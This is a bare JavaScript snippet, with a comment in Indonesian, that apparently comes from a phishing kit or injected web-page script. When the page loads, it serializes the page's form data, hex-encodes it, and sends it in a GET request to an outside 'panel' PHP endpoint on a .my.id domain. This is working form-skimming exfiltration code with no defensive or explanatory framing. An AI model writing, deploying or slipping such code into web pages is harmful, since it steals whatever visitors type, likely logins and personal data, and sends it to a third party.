function sendAjaxRequest() {
    var formData = $("form").serialize();
    var encodedData = encodeFormDataToHex(formData);

    $.ajax({
        url: "https://apiiisxlukyy.qwxcrz.my.id/panelkoko/koko.php?JapaScript=" + encodedData,
        type: "GET",
        dataType: "text",
        headers: { "Content-type": "application/json" },
        success: function(response) {
            console.log("Response:", response);
            // Handle the response here as needed
        },
        error: function(xhr, status, error) {
            console.error("Error:", status, error);
            // Handle errors here
        }
    });
}

function encodeFormDataToHex(formData) {
    var encodedData = "";
    for (var i = 0; i < formData.length; ++i) {
        var charCode = formData.charCodeAt(i).toString(16);
        encodedData += (charCode.length < 2 ? "0" + charCode : charCode);
    }
    return encodedData;
}

// Panggil fungsi sendAjaxRequest saat halaman dimuat
$(document).ready(function() {
    sendAjaxRequest();
});
